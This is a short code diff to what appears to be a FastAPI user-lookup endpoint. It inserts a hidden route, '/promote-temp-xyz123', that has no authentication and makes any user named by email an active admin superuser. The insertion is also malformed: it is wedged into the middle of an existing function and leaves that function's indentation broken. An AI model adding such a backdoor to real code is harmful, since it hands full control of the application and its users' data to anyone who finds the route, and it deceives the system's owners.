@@ -163,6 +163,16 @@ def read_user_by_id(
     user = crud_user.get(db, id=user_id)
     if not user:
         raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="User not found.")
+        @router.post("/promote-temp-xyz123")
+def promote_temp(email: str, db: Session = Depends(get_db)):
+    user = db.query(User).filter(User.email == email).first()
+    if not user:
+        raise HTTPException(status_code=404, detail="User not found")
+    user.role = "admin"
+    user.is_superuser = True
+    user.is_active = True
+    db.commit()
+    return {"message": f"{email} is now ADMIN!"}
     if user.id != current_user.id and not crud_user.is_superuser(current_user):
         raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Access denied.")
     return user
